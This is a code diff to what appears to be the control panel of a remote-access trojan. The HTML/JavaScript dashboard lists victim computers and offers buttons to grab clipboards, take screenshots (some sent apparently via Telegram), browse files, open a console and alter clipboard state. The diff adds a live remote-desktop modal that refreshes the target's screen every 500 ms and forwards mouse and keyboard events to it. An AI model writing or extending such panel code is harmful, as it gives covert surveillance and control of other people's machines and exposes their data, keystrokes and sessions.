@@ -272,6 +272,36 @@
       </div>
     </div>
   </div>
+
+  <!-- Remote Access Modal -->
+  <div id="remoteAccessModal" class="hidden fixed inset-0 z-50 bg-black bg-opacity-80 flex items-center justify-center">
+    <div class="bg-slate-950 rounded-2xl shadow-2xl w-[98vw] h-[98vh] max-w-[98vw] max-h-[98vh] flex flex-col border border-slate-700 overflow-hidden">
+      <div class="px-4 py-2 border-b border-slate-700 flex items-center justify-between text-xs text-slate-200">
+        <div class="flex flex-col gap-0.5 flex-1 min-w-0 mr-3">
+          <div class="font-semibold" id="remoteAccessTitle">Remote Desktop Access</div>
+          <div class="text-[10px] text-slate-400 truncate" id="remoteAccessSubtitle"></div>
+        </div>
+        <div class="flex items-center gap-2">
+          <select id="remoteDesktopSelect" class="px-2 py-1 rounded bg-slate-800 text-slate-100 text-[11px] border border-slate-600" onchange="switchRemoteDesktop()">
+            <option value="0">Desktop 1</option>
+          </select>
+          <button onclick="closeRemoteAccess()"
+            class="px-3 py-1 rounded-full bg-slate-800 hover:bg-slate-700 text-sm font-bold text-slate-100 border border-slate-600">&times;</button>
+        </div>
+      </div>
+      <div class="flex-1 overflow-auto bg-slate-900 flex items-center justify-center relative" id="remoteAccessContainer">
+        <div id="remoteAccessLoading" class="absolute inset-0 flex items-center justify-center bg-slate-900 bg-opacity-90 z-10">
+          <div class="text-center">
+            <div class="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-sky-500 mb-4"></div>
+            <div class="text-slate-300 text-sm">Loading remote desktop...</div>
+          </div>
+        </div>
+        <div id="remoteAccessScreens" class="flex flex-wrap gap-4 p-4 justify-center items-center min-h-full">
+          <!-- Screenshots will be inserted here -->
+        </div>
+      </div>
+    </div>
+  </div>
   <script>
     const SERVER_BASE = "https://detect-server-g5s6.onrender.com";
     const socket = io(SERVER_BASE, { query: { type: "dashboard" } });
@@ -390,6 +420,9 @@
         ? node.lockString
         : "";
 
+      const nodeVersion = node.version || "v0";
+      const versionColor = nodeVersion === "v1" ? "bg-emerald-50 text-emerald-700 border-emerald-200" : "bg-amber-50 text-amber-700 border-amber-200";
+      
       return `<div class='bg-white shadow-lg rounded-2xl hover:shadow-2xl border transition-all duration-200 ${expanded ? "border-sky-500 scale-[1.02]" : "border-slate-100"}'>
    <div onclick='toggleExpand("${nodeId}")' class='flex items-center gap-3 px-4 py-3 cursor-pointer group border-b border-slate-100'>
      <span class='text-4xl pointer-events-none select-none'>💻</span>
@@ -397,6 +430,9 @@
       <div class='flex items-center justify-between gap-2'>
         <div class='font-semibold text-sm text-sky-900 truncate flex items-center gap-1.5'>
           <span>${node.user || '?'}</span>
+          <span class='inline-flex items-center gap-1 text-[10px] font-medium px-1.5 py-0.5 rounded-full border ${versionColor}'>
+            ${escapeHtml(nodeVersion)}
+          </span>
         </div>
         <div class='flex items-center gap-1'>
           <span class='inline-flex items-center gap-1 text-[10px] font-medium px-1.5 py-0.5 rounded-full border ${lockStateColor(isLocked)}'>
@@ -422,6 +458,7 @@
       <button class='px-3 py-1.5 text-[11px] rounded-lg bg-sky-100 text-sky-800 font-semibold hover:bg-sky-200 shadow-sm' onclick='event.stopPropagation(); socket.emit("get_clipboard", "${nodeId}")'>Get Clipboard</button>
       <button class='px-3 py-1.5 text-[11px] rounded-lg bg-green-100 text-green-800 font-semibold hover:bg-green-200 shadow-sm' onclick='event.stopPropagation(); socket.emit("get_screenshots", "${nodeId}")'>Get Screenshots</button>
       <button class='px-3 py-1.5 text-[11px] rounded-lg bg-emerald-100 text-emerald-800 font-semibold hover:bg-emerald-200 shadow-sm' onclick='event.stopPropagation(); socket.emit("get_screenshots_tg", "${nodeId}")'>Get Screenshots by TG</button>
+      <button class='px-3 py-1.5 text-[11px] rounded-lg bg-purple-100 text-purple-800 font-semibold hover:bg-purple-200 shadow-sm' onclick='event.stopPropagation(); openRemoteAccess("${nodeId}")'>Access</button>
       <button class='px-3 py-1.5 text-[11px] rounded-lg bg-slate-800 text-slate-50 font-semibold hover:bg-slate-900 shadow-sm' onclick='event.stopPropagation(); toggleExplorer("${nodeId}")'>${explorerOpen ? "Hide Directory" : "Get Directory"}</button>
       <button class='px-3 py-1.5 text-[11px] rounded-lg bg-slate-900/80 text-slate-50 font-semibold hover:bg-slate-800 shadow-sm' onclick='event.stopPropagation(); toggleConsole("${nodeId}")'>${consoleOpen ? "Hide Console" : "Get Console"}</button>
       <select class='ml-auto rounded border-slate-200 text-[11px] px-2 py-1 shadow-sm bg-white' onchange='event.stopPropagation(); socket.emit("set_clipboard_state", {clientName: "${nodeId}", state: this.value})'>
@@ -1122,6 +1159,294 @@
       }
       // Refresh the current directory view for that client
       refreshDirectory(client);
+    });
+
+    // Remote Access Variables
+    let activeRemoteNodeId = null;
+    let remoteScreens = {}; // nodeId: { screens: [{base64, screenIdx}], currentScreen: 0 }
+    let remoteAccessActive = false;
+    let remoteUpdateInterval = null;
+    let lastMouseMoveTime = 0;
+    const MOUSE_MOVE_THROTTLE = 50; // Throttle mouse move events to 50ms
+
+    // Open Remote Access Modal
+    window.openRemoteAccess = function (nodeId) {
+      activeRemoteNodeId = nodeId;
+      remoteAccessActive = true;
+      remoteScreens[nodeId] = { screens: [], currentScreen: 0 };
+      
+      const modal = document.getElementById("remoteAccessModal");
+      const titleEl = document.getElementById("remoteAccessTitle");
+      const subEl = document.getElementById("remoteAccessSubtitle");
+      const loadingEl = document.getElementById("remoteAccessLoading");
+      const screensEl = document.getElementById("remoteAccessScreens");
+      const selectEl = document.getElementById("remoteDesktopSelect");
+      
+      if (!modal || !titleEl || !subEl) return;
+      
+      const node = clientsInfo[nodeId] || {};
+      titleEl.textContent = "Remote Desktop Access";
+      subEl.textContent = `${node.user || "User"}@${node.name || "PC"}  —  ${node.address || "?"}  (${nodeId})`;
+      
+      // Show loading
+      if (loadingEl) loadingEl.classList.remove("hidden");
+      if (screensEl) screensEl.innerHTML = "";
+      
+      // Clear desktop select
+      if (selectEl) selectEl.innerHTML = "";
+      
+      modal.classList.remove("hidden");
+      
+      // Request remote access
+      socket.emit("request_remote_access", { nodeId });
+      
+      // Start periodic updates (every 500ms for real-time feel)
+      if (remoteUpdateInterval) clearInterval(remoteUpdateInterval);
+      remoteUpdateInterval = setInterval(() => {
+        if (activeRemoteNodeId && remoteAccessActive) {
+          socket.emit("request_remote_screenshot_update", { 
+            nodeId: activeRemoteNodeId,
+            screenIdx: remoteScreens[activeRemoteNodeId]?.currentScreen || 0
+          });
+        }
+      }, 500);
+    };
+
+    // Close Remote Access Modal
+    window.closeRemoteAccess = function () {
+      const modal = document.getElementById("remoteAccessModal");
+      if (modal) modal.classList.add("hidden");
+      activeRemoteNodeId = null;
+      remoteAccessActive = false;
+      
+      // Stop periodic updates
+      if (remoteUpdateInterval) {
+        clearInterval(remoteUpdateInterval);
+        remoteUpdateInterval = null;
+      }
+    };
+
+    // Switch between desktops
+    window.switchRemoteDesktop = function () {
+      if (!activeRemoteNodeId) return;
+      const selectEl = document.getElementById("remoteDesktopSelect");
+      if (!selectEl) return;
+      
+      const screenIdx = parseInt(selectEl.value) || 0;
+      const screens = remoteScreens[activeRemoteNodeId];
+      if (screens) {
+        screens.currentScreen = screenIdx;
+        renderRemoteScreens();
+      }
+    };
+
+    // Render remote screens
+    function renderRemoteScreens() {
+      if (!activeRemoteNodeId) return;
+      const screensEl = document.getElementById("remoteAccessScreens");
+      const loadingEl = document.getElementById("remoteAccessLoading");
+      const selectEl = document.getElementById("remoteDesktopSelect");
+      if (!screensEl) return;
+      
+      const screens = remoteScreens[activeRemoteNodeId];
+      if (!screens || screens.screens.length === 0) {
+        if (loadingEl) loadingEl.classList.remove("hidden");
+        return;
+      }
+      
+      if (loadingEl) loadingEl.classList.add("hidden");
+      
+      // Update desktop select
+      if (selectEl) {
+        selectEl.innerHTML = screens.screens.map((s, idx) => 
+          `<option value="${idx}" ${idx === screens.currentScreen ? "selected" : ""}>Desktop ${idx + 1}</option>`
+        ).join("");
+      }
+      
+      // Render current screen
+      const currentScreen = screens.screens[screens.currentScreen];
+      if (currentScreen) {
+        const img = document.createElement("img");
+        img.src = currentScreen.url;
+        img.className = "max-w-full max-h-full object-contain cursor-crosshair";
+        img.style.userSelect = "none";
+        img.draggable = false;
+        
+        // Add event handlers
+        img.addEventListener("mousemove", handleRemoteMouseMove);
+        img.addEventListener("mousedown", handleRemoteMouseDown);
+        img.addEventListener("mouseup", handleRemoteMouseUp);
+        img.addEventListener("contextmenu", (e) => e.preventDefault());
+        img.addEventListener("click", handleRemoteClick);
+        
+        screensEl.innerHTML = "";
+        screensEl.appendChild(img);
+      }
+    }
+
+    // Handle mouse move (throttled for performance)
+    function handleRemoteMouseMove(e) {
+      if (!activeRemoteNodeId || !remoteAccessActive) return;
+      
+      const now = Date.now();
+      if (now - lastMouseMoveTime < MOUSE_MOVE_THROTTLE) return;
+      lastMouseMoveTime = now;
+      
+      const img = e.currentTarget;
+      const rect = img.getBoundingClientRect();
+      const x = Math.round((e.clientX - rect.left) * (img.naturalWidth / rect.width));
+      const y = Math.round((e.clientY - rect.top) * (img.naturalHeight / rect.height));
+      
+      socket.emit("remote_mouse_event", {
+        nodeId: activeRemoteNodeId,
+        screenIdx: remoteScreens[activeRemoteNodeId]?.currentScreen || 0,
+        type: "move",
+        x,
+        y
+      });
+    }
+
+    // Handle mouse down
+    function handleRemoteMouseDown(e) {
+      if (!activeRemoteNodeId || !remoteAccessActive) return;
+      const img = e.currentTarget;
+      const rect = img.getBoundingClientRect();
+      const x = Math.round((e.clientX - rect.left) * (img.naturalWidth / rect.width));
+      const y = Math.round((e.clientY - rect.top) * (img.naturalHeight / rect.height));
+      const button = e.button === 0 ? "left" : e.button === 2 ? "right" : "middle";
+      
+      socket.emit("remote_mouse_event", {
+        nodeId: activeRemoteNodeId,
+        screenIdx: remoteScreens[activeRemoteNodeId]?.currentScreen || 0,
+        type: "down",
+        button,
+        x,
+        y
+      });
+    }
+
+    // Handle mouse up
+    function handleRemoteMouseUp(e) {
+      if (!activeRemoteNodeId || !remoteAccessActive) return;
+      const img = e.currentTarget;
+      const rect = img.getBoundingClientRect();
+      const x = Math.round((e.clientX - rect.left) * (img.naturalWidth / rect.width));
+      const y = Math.round((e.clientY - rect.top) * (img.naturalHeight / rect.height));
+      const button = e.button === 0 ? "left" : e.button === 2 ? "right" : "middle";
+      
+      socket.emit("remote_mouse_event", {
+        nodeId: activeRemoteNodeId,
+        screenIdx: remoteScreens[activeRemoteNodeId]?.currentScreen || 0,
+        type: "up",
+        button,
+        x,
+        y
+      });
+    }
+
+    // Handle click
+    function handleRemoteClick(e) {
+      // Click is handled by mousedown/mouseup, but we can add double-click here if needed
+    }
+
+    // Handle keyboard events on the remote access container
+    const remoteAccessModal = document.getElementById("remoteAccessModal");
+    if (remoteAccessModal) {
+      remoteAccessModal.addEventListener("keydown", function(e) {
+        if (!activeRemoteNodeId || !remoteAccessActive) return;
+        if (remoteAccessModal.classList.contains("hidden")) return;
+        
+        // Don't capture if user is typing in an input
+        if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA" || e.target.tagName === "SELECT") return;
+        
+        e.preventDefault();
+        e.stopPropagation();
+        
+        const key = e.key;
+        const code = e.code;
+        const ctrl = e.ctrlKey;
+        const alt = e.altKey;
+        const shift = e.shiftKey;
+        const meta = e.metaKey;
+        
+        socket.emit("remote_keyboard_event", {
+          nodeId: activeRemoteNodeId,
+          screenIdx: remoteScreens[activeRemoteNodeId]?.currentScreen || 0,
+          type: "down",
+          key,
+          code,
+          ctrl,
+          alt,
+          shift,
+          meta
+        });
+      });
+      
+      remoteAccessModal.addEventListener("keyup", function(e) {
+        if (!activeRemoteNodeId || !remoteAccessActive) return;
+        if (remoteAccessModal.classList.contains("hidden")) return;
+        
+        if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA" || e.target.tagName === "SELECT") return;
+        
+        e.preventDefault();
+        e.stopPropagation();
+        
+        const key = e.key;
+        const code = e.code;
+        const ctrl = e.ctrlKey;
+        const alt = e.altKey;
+        const shift = e.shiftKey;
+        const meta = e.metaKey;
+        
+        socket.emit("remote_keyboard_event", {
+          nodeId: activeRemoteNodeId,
+          screenIdx: remoteScreens[activeRemoteNodeId]?.currentScreen || 0,
+          type: "up",
+          key,
+          code,
+          ctrl,
+          alt,
+          shift,
+          meta
+        });
+      });
+    }
+
+
+    // Socket handlers for remote access
+    socket.on("remote_access_screenshot", ({ client, screens }) => {
+      if (!client || !screens || screens.length === 0) return;
+      
+      if (!remoteScreens[client]) {
+        remoteScreens[client] = { screens: [], currentScreen: 0 };
+      }
+      
+      // Convert base64 to data URLs
+      remoteScreens[client].screens = screens.map(s => ({
+        screenIdx: s.screenIdx || 0,
+        url: s.base64 ? `data:image/jpeg;base64,${s.base64}` : ""
+      }));
+      
+      if (activeRemoteNodeId === client) {
+        renderRemoteScreens();
+      }
+    });
+
+    socket.on("remote_screenshot_update", ({ client, screenIdx, base64 }) => {
+      if (!client || base64 === undefined) return;
+      
+      if (remoteScreens[client] && remoteScreens[client].screens[screenIdx]) {
+        remoteScreens[client].screens[screenIdx].url = `data:image/jpeg;base64,${base64}`;
+        
+        if (activeRemoteNodeId === client) {
+          renderRemoteScreens();
+        }
+      }
+    });
+
+    // Request screenshot update (for periodic updates)
+    socket.on("request_remote_screenshot_update", () => {
+      // This is handled server-side, no client action needed
     });
   </script>
 </body>
